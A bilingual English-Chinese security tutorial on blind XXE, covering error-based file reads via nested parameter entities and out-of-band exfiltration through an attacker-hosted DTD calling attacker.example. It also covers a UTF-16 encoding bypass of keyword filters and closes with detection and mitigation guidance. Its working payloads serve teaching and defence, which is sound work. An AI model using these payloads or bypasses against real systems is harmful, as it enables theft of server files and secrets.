---
id: xxe-bypass-and-detection
title_en: "XXE, Part 2 — Blind Reads, Encoding and Detection"
title_zh: "XXE（二）：盲读、编码与检测"
summary_en: When the content cannot be seen, it has to be moved — into an error message or into a request the server makes. This entry builds both, shows a measured error-based read on two parsers, demonstrates that a UTF-16 document defeats any filter looking at raw bytes, and states why refusing the DOCTYPE closes the blind variants too.
summary_zh: 看不到内容的时候，就得把内容搬出来 —— 搬进一条报错里，或者搬成一次服务器自己发出的请求。这一篇把这两种都搭出来，给出在两个解析器上实测的错误回显读取，演示一份 UTF-16 文档如何打穿任何看原始字节的过滤器，并说明为什么"拒绝 DOCTYPE"连盲读也一起关掉。
tags: [web, xxe, blind-xxe, oob, cwe-611, encoding-bypass]
tools: [python3, php, java, Burp Suite, curl]
attck: [T1190, T1048]
platform: [web]
difficulty: intermediate
updated: 2026-10-08
---

<!-- lang:en -->
### The common case is that you cannot see anything

The first entry assumed the classic shape: an entity is resolved and its content appears in the response. In practice that is the minority case. More often:

- The endpoint parses the document and **returns only success or failure**.
- The parsing happens in a **background job**, a queue consumer or an import pipeline, and nothing is echoed back.
- The result is stored and rendered somewhere the attacker cannot reach.
- The response is a **redirect**, a status code, or an empty body.

So the question becomes: **how do you get the content out when the application will not hand it to you?** There are exactly two answers, and they map onto two channels the server has whether the application meant to expose them or not.

| Channel | How the content travels | Requires |
|---|---|---|
| **Error messages** | The content is embedded in a path the parser fails to load, and appears in the resulting error | Errors visible to the attacker |
| **Outbound requests** | The content is embedded in a URL the parser fetches | Network egress from the server |

Everything in this entry is a variant of those two.

### Moving the content into an error message

The trick is to make the file's content part of something the parser will **complain about**. A parser that fails to load a resource prints the resource's path, so if the path contains the file's content, the error contains it too.

```xml
<?xml version="1.0"?>
<!DOCTYPE r [
  <!ENTITY % file SYSTEM "file:///etc/hostname">
  <!ENTITY % eval "<!ENTITY &#x25; err SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
  %err;
]>
<r>x</r>
```

Reading it line by line:

- `%file` is a **parameter entity** whose value is the file's content.
- `%eval` is a parameter entity whose value is **a declaration** — it defines another parameter entity, `err`, whose system identifier is a path that **ends with the file's content**. `&#x25;` is the escaped percent sign, needed because this is being written inside another declaration.
- `%eval;` causes that inner declaration to be evaluated.
- `%err;` references the resulting entity, and the parser tries to load `/nonexistent/<file content>`, fails, and reports the path.

Measured on two parser stacks, with an inline DTD and the same chain moved into an external DTD:

| Parser | Inline DTD | External DTD |
|---|---|---|
| **PHP libxml** | no content in the errors | **`failed to load "file:///nonexistent/LEAKED-VIA-PARAMETER-ENTITY": No such file or directory`** |
| **Java Xerces** | rejected — the inline nesting is not accepted in that form | **`/nonexistent/LEAKED-VIA-PARAMETER-ENTITY (No such file or directory)`** |

Two things to take from that table beyond "it works":

**The content travels as a filename.** Nothing about this reads like data exfiltration — it is a parser reporting that it could not open a file, which is an ordinary thing for a parser to do. That is also why it is hard to filter: the request contains no file content, and the *response* contains a plausible error.

**The external DTD form is the one that worked on both.** The inline form depends on how each parser treats nested declarations inside a DTD; the external one does not, because the declarations live in a document the parser loads on its own terms. That makes the external DTD the more portable construction, and it has a second benefit below.

### Moving the content into a request the server makes

If the server has network egress, the content can be sent to the attacker instead of being read back:

```xml
<?xml version="1.0"?>
<!DOCTYPE r SYSTEM "http://attacker.example/evil.dtd">
<r>x</r>
```

And `evil.dtd`, served by the attacker:

```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % send "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.example/?d=%file;'>">
%send;
%exfil;
```

The chain is the same shape as the error variant, with the failure replaced by a successful request whose **URL carries the content**. Three practical notes:

**DNS is often the only channel that survives.** HTTP egress to arbitrary hosts is frequently blocked while DNS resolution is allowed, so sending the data as a label in a query is more reliable than sending it in a path. The observation is also cheaper: **DNS logs show the attempt even when the connection itself never happens.**

**Content with newlines or special characters breaks the URL.** Real chains therefore handle the file in pieces, or read files that are single-line by nature — a hostname, a token, a key file's header. Reading `/etc/passwd` in one request is a demonstration; reading a token is an operation.

**The external DTD is what makes this portable.** The document itself can stay almost empty — a `DOCTYPE` pointing at the attacker's server — which brings us to the bypass section.

### Why the external DTD is the load-bearing part

Two reasons, and the second is the one that matters for defence.

**Parameter entities are needed to build the chain, and they only work inside a DTD.** A general entity (`&x;`) can be referenced in document content; a parameter entity (`%x;`) can be referenced **within the DTD**, which is where the nesting above has to happen. That is not a stylistic choice — the construction requires it.

**And not every parser supports external parameter entities.** This is the practical boundary, and it should be checked before a payload is written rather than after:

| Parser | External parameter entities |
|---|---|
| **libxml2** (PHP, and many C libraries) | Supported — the error-based chain above worked |
| **Xerces** (Java) | Supported — the same chain worked |
| **expat** (Python's `xml.sax`, `xml.etree`) | **Not supported** — the blind and out-of-band constructions do not apply |

That last row is why a Python service can be vulnerable to in-band reading while the whole blind family is inapplicable to it. **The stack decides which techniques exist, not the payload.** Asking "which parser, which version, which wrapper library" first is the same discipline the language entry's four-step method asks for.

### Encoding: the filter sees bytes, the parser sees characters

This is the cleanest bypass in the entry, and it follows from something XML does by design.

**An XML document declares its own encoding.** The first line can say `encoding="UTF-16"`, and the parser will decode the rest of the document accordingly. A filter operating on the raw request body is looking at **bytes**; the parser is looking at **characters**.

Measured with the same document in two encodings:

| Encoding | First 16 bytes | Contains the ASCII string `<!ENTITY`? | Parser result |
|---|---|---|---|
| UTF-8 | `<?xml version="1` | yes | reads the file |
| UTF-16 | `\xff\xfe<\x00?\x00x\x00m\x00l\x00 \x00v\x00` | **no** | **reads the file** |

That third column is the whole point: **in the UTF-16 form there is no ASCII `<!ENTITY` anywhere in the bytes**, and the parser resolves the entity anyway, because it decodes according to the declaration before parsing.

The generalisation:

> **Any filter that matches keywords in the raw bytes can be defeated by a document that is valid in another encoding.** The filter would have to decode the document the same way the parser does — including honouring the encoding declaration — before it could make a claim about what the document contains.

That is the same two-parser disagreement as everywhere in this series, and it is why a WAF rule of the form "block `<!ENTITY`" is a rule about a byte sequence rather than about an XML document.

Related forms worth trying when UTF-16 is handled: `encoding="UTF-16LE"` or `"UTF-16BE"` without a BOM, a BOM with a different declared encoding, and UTF-7 in older stacks. The principle is the same in each case — **the declaration and the bytes do not have to agree in a way the filter expects.**

### What does not work, and why that is useful

XXE has fewer obfuscation options than XSS or SQL injection, and knowing the boundary saves time:

- **Case does not help.** XML is **case-sensitive**: `<!doctype` is not a DOCTYPE, it is a parse error. There is no equivalent of the `<ScRiPt>` trick here.
- **Entity names are arbitrary but irrelevant.** Renaming `file` to `x` changes nothing about whether the technique works.
- **Comments inside a DTD do not change the semantics.** They change the byte pattern and nothing else.
- **Whitespace and line breaks are not an obfuscation either**, since the parser normalises them as part of parsing.

So the productive directions are exactly two: **change the encoding** (which changes what the filter sees while leaving the document valid) and **move the declarations out of the document** (which changes what the filter can see at all). Both are structural, and neither depends on guessing a keyword list.

### Detection and mitigation

- **Alert on outbound fetches of a DTD.** An application server retrieving a `.dtd` from an arbitrary host is extraordinary, and it is the single most reliable signal that an XXE chain is being built — because the external DTD is what both the error-based and outbound variants depend on. Log and alert on every outbound request made during XML processing.
- **Watch DNS, not only HTTP.** An out-of-band chain that fails to connect may still have resolved a name, and DNS logs are where that shows up. Alert on resolutions of unexpected domains from application servers, and treat a burst of lookups with long, high-entropy labels as an exfiltration attempt rather than as noise.
- **Treat non-UTF-8 XML as unusual.** A request or upload carrying UTF-16 or UTF-16LE encoded XML is rare in ordinary traffic, and it is exactly the shape an encoding bypass takes. Decode the document the way the parser will **before** inspecting it, and alert on a mismatch between the declared encoding and what the surrounding protocol expects.
- **Alert on DTD syntax, including in the parts that do not look like content.** `<!DOCTYPE`, `<!ENTITY`, `SYSTEM`, `PUBLIC` and `%`-prefixed parameter entities, in uploads as well as in bodies — and remember that the external-DTD form leaves the document almost empty, so an application fetching an unexpected URL is the remaining half of the signal.
- **Watch parse errors for path and content fragments.** An error naming a path that contains something from a file on the server is the error-based variant reporting itself. Errors that mention `/nonexistent/` or a path with an unusual suffix deserve a look, and error text should not be returned to clients in the first place.
- **For mitigation, refuse the DOCTYPE and close the outbound side.** Refusing documents with a DOCTYPE removes in-band, error-based and out-of-band variants at once, because all of them are built out of entities. Then disable external **parameter** entities as well — the common mistake is disabling general entities only — and stop loading external DTDs.
- **Constrain egress independently of the parser.** Even with a correctly configured parser, a library upgrade or a new code path can re-enable a feature; network policy that stops a web process from reaching arbitrary hosts, and DNS policy that stops it resolving them, is what keeps a mistake from becoming an exfiltration.
- **And keep parser privilege low.** The parser reads files and makes requests as the application. Least privilege and a restricted environment bound what a successful read can reach, which is the difference between a hostname and a private key.

<!-- lang:zh -->
### 常见情况是：你什么都看不到

第一篇假设的是那个经典形状：实体被解析、内容出现在响应里。实践中那反而是少数。更常见的是：

- 端点解析完文档，**只返回成功或失败**。
- 解析发生在**后台任务**、队列消费者或导入流水线里，什么都不回显。
- 结果被存下来、渲染在攻击者够不着的地方。
- 响应是一个**重定向**、一个状态码，或者空的。

于是问题变成：**当应用不肯把内容交给你时，怎么把内容弄出来？** 答案恰好有两个，而它们对应服务器无论应用是否有意暴露都拥有的两条通道。

| 通道 | 内容怎么走 | 需要什么 |
|---|---|---|
| **报错信息** | 内容被嵌进一个解析器加载失败的路径，出现在产生的错误里 | 攻击者能看到错误 |
| **出站请求** | 内容被嵌进解析器去取的那个 URL | 服务器有出网 |

这一篇里的每一样东西，都是这两者的变体。

### 把内容搬进一条报错里

诀窍是让文件内容成为**解析器会抱怨的那个东西**的一部分。解析器加载资源失败时会把路径打出来，所以如果路径里含文件内容，错误里也就含了。

```xml
<?xml version="1.0"?>
<!DOCTYPE r [
  <!ENTITY % file SYSTEM "file:///etc/hostname">
  <!ENTITY % eval "<!ENTITY &#x25; err SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
  %err;
]>
<r>x</r>
```

逐行读：

- `%file` 是一个**参数实体**，它的值是文件内容。
- `%eval` 是一个参数实体，它的值是**一句声明** —— 它定义了另一个参数实体 `err`，其系统标识符是一条**以文件内容结尾**的路径。`&#x25;` 是转义过的百分号，因为这段是写在另一句声明里面的。
- `%eval;` 让里面那句声明被求值。
- `%err;` 引用由此产生的实体，解析器去加载 `/nonexistent/<文件内容>`、失败、然后把路径报出来。

在两个解析器栈上实测，分别用内联 DTD 和把同一条链挪进外部 DTD：

| 解析器 | 内联 DTD | 外部 DTD |
|---|---|---|
| **PHP libxml** | 错误里没有内容 | **`failed to load "file:///nonexistent/LEAKED-VIA-PARAMETER-ENTITY": No such file or directory`** |
| **Java Xerces** | 被拒绝 —— 那种形式的内联嵌套不被接受 | **`/nonexistent/LEAKED-VIA-PARAMETER-ENTITY (No such file or directory)`** |

从那张表里除了"它能用"，还有两点要拿走：

**内容是以文件名的形式流动的。** 这一整套读起来都不像数据外泄 —— 它是一个解析器在报告它打不开某个文件，而那是解析器很平常的一件事。这也是它难以过滤的原因：请求里没有任何文件内容，而**响应**里只有一条看起来合理的错误。

**两种解析器上都成立的是外部 DTD 那种形式。** 内联形式取决于每个解析器怎么对待 DTD 内部的嵌套声明；外部形式不取决于这个，因为那些声明活在一份解析器按自己的规则加载的文档里。这让外部 DTD 成为更可移植的构造，而它还有第二个好处，见下。

### 把内容搬成一次服务器发出的请求

如果服务器有出网，内容可以被送到攻击者那里，而不是被读回来：

```xml
<?xml version="1.0"?>
<!DOCTYPE r SYSTEM "http://attacker.example/evil.dtd">
<r>x</r>
```

而由攻击者提供的 `evil.dtd`：

```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % send "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.example/?d=%file;'>">
%send;
%exfil;
```

这条链和报错那个形状一样，只是把"失败"换成了"一次成功的请求，而 **URL 里带着内容**"。三个实用提示：

**DNS 常常是唯一活下来的通道。** 到任意主机的 HTTP 出网经常被挡住，而 DNS 解析被允许，所以把数据作为一个查询的标签发出去，比放在路径里更可靠。观测成本也更低：**即使连接从未建立，DNS 日志也能显示这次尝试。**

**含换行或特殊字符的内容会破坏 URL。** 所以真实的链会把文件分片处理，或者去读那些天生单行的文件 —— 一个主机名、一个令牌、一个密钥文件的头部。一次请求读完 `/etc/passwd` 是演示；读一个令牌才是操作。

**外部 DTD 是让它可移植的原因。** 文档本身几乎可以是空的 —— 一个指向攻击者服务器的 `DOCTYPE` —— 这就把我们带到了下一节。

### 为什么外部 DTD 是承重的那一块

两个原因，而第二个对防御才要紧。

**搭这条链需要参数实体，而参数实体只在 DTD 内部能用。** 通用实体（`&x;`）可以在文档内容里引用；参数实体（`%x;`）可以在 **DTD 内部**引用，而上面那个嵌套正需要在那里发生。这不是风格选择 —— 这个构造必须如此。

**而且不是每个解析器都支持外部参数实体。** 这是实用上的边界，应该在写 payload **之前**就查清，而不是之后：

| 解析器 | 外部参数实体 |
|---|---|
| **libxml2**（PHP，以及很多 C 库） | 支持 —— 上面的错误回显链跑通了 |
| **Xerces**（Java） | 支持 —— 同一条链跑通了 |
| **expat**（Python 的 `xml.sax`、`xml.etree`） | **不支持** —— 盲读与带外那两种构造不适用 |

最后那一行解释了：为什么一个 Python 服务可以对带内读取脆弱，而整个盲读家族对它都不适用。**决定存在哪些技术的是技术栈，不是 payload。** 先问"哪个解析器、哪个版本、外面包了哪个库"，正是语言篇那套四步方法所要求的纪律。

### 编码：过滤器看的是字节，解析器看的是字符

这是本篇里最干净的一个绕过，而它源自 XML 按设计就有的一个性质。

**XML 文档会自己声明编码。** 第一行可以写 `encoding="UTF-16"`，然后解析器就按此解码文档的其余部分。而一个对原始请求体做匹配的过滤器，看的是**字节**；解析器看的是**字符**。

同一份文档用两种编码实测：

| 编码 | 前 16 字节 | 含 ASCII 串 `<!ENTITY` 吗 | 解析结果 |
|---|---|---|---|
| UTF-8 | `<?xml version="1` | 含 | 读到文件 |
| UTF-16 | `\xff\xfe<\x00?\x00x\x00m\x00l\x00 \x00v\x00` | **不含** | **读到文件** |

第三列就是全部要点：**在 UTF-16 那种形式里，这些字节中任何地方都没有 ASCII 的 `<!ENTITY`**，而解析器照样解析了那个实体，因为它在解析之前先按声明解码了。

推广开来：

> **任何在原始字节里匹配关键字的过滤器，都可以被一份"用另一种编码表示却依然合法"的文档打穿。** 过滤器必须用**和解析器一样的方式**解码这份文档 —— 包括遵守那个编码声明 —— 才有资格对"文档里有什么"下判断。

这和本系列里处处出现的"两个解析器不一致"是同一件事，也是为什么一条"拦截 `<!ENTITY`"的 WAF 规则，是一条关于**字节序列**的规则，而不是关于**XML 文档**的规则。

UTF-16 被处理之后还值得试的相关形式：不带 BOM 的 `encoding="UTF-16LE"` 或 `"UTF-16BE"`、带 BOM 却声明另一种编码、以及老技术栈里的 UTF-7。原则在每种情况下都一样 —— **声明与字节不必以过滤器预期的那种方式一致。**

### 哪些做法不管用，以及为什么这有用

XXE 的混淆手段比 XSS 或 SQL 注入少，知道这条边界能省时间：

- **大小写没用。** XML 是**大小写敏感**的：`<!doctype` 不是 DOCTYPE，它是一个解析错误。这里没有 `<ScRiPt>` 那种手法。
- **实体名可以随便起，但无关紧要。** 把 `file` 改名成 `x` 不改变这个技术成不成立。
- **DTD 里的注释不改变语义。** 它们只改变字节形态，仅此而已。
- **空白与换行也不是混淆**，因为解析器会把它们当作解析的一部分规范化掉。

所以有效的方向恰好只有两个：**换编码**（改变过滤器看到的东西，而文档仍然合法），以及**把声明挪出文档**（改变过滤器根本能看到什么）。两者都是结构性的，都不依赖去猜一份关键字清单。

### 检测与缓解

- **对"出去取 DTD"告警。** 一台应用服务器从任意主机取一个 `.dtd` 是极不寻常的事，而它是"有人在搭 XXE 链"最可靠的单一信号 —— 因为外部 DTD 正是错误回显与带外两种变体都依赖的东西。把 XML 处理期间发出的每一个出站请求记下来并告警。
- **盯 DNS，而不只是盯 HTTP。** 一条连接失败的带外链可能仍然解析过一个名字，而 DNS 日志正是它出现的地方。对应用服务器解析意外域名告警，并把一批标签很长、熵很高的查询当作外泄尝试，而不是噪声。
- **把非 UTF-8 的 XML 当作异常。** 请求或上传里携带 UTF-16 或 UTF-16LE 编码的 XML，在普通流量里很罕见，而它恰恰是编码绕过所呈现的形状。**在检查之前**，先按解析器会用的方式把文档解码，并对"声明的编码"与"外围协议预期"之间的不一致告警。
- **对 DTD 语法告警，包括那些看起来不像内容的部分。** `<!DOCTYPE`、`<!ENTITY`、`SYSTEM`、`PUBLIC` 以及 `%` 开头的参数实体，在上传里和在请求体里都算 —— 并且记住：外部 DTD 那种形式会让文档几乎是空的，所以**"应用去取了一个意外 URL"就是信号剩下的一半**。
- **在解析错误里找路径与内容碎片。** 一条点名了某个路径、而那个路径里含有服务器上文件内容的错误，就是错误回显变体在自我报告。提到 `/nonexistent/` 或带异常后缀路径的错误值得看一眼，而错误文本本来就不该返回给客户端。
- **缓解上，拒绝 DOCTYPE 并关掉出站那一侧。** 拒绝带 DOCTYPE 的文档会一次性移除带内、错误回显和带外三种变体，因为它们全都是用实体搭出来的。然后**连外部参数实体一起关掉** —— 常见错误是只关了通用实体 —— 并停止加载外部 DTD。
- **在网络侧独立地约束出网。** 即使解析器配置正确，一次库升级或一条新代码路径都可能把某个特性重新打开；让 Web 进程到不了任意主机、也解析不了它们的网络与 DNS 策略，才是让一个失误不变成一次外泄的东西。
- **并且让解析器保持低权限。** 解析器以应用的身份读文件、发请求。最小权限与受限环境会限制一次成功的读取能够到什么 —— 那是"一个主机名"与"一把私钥"之间的差别。
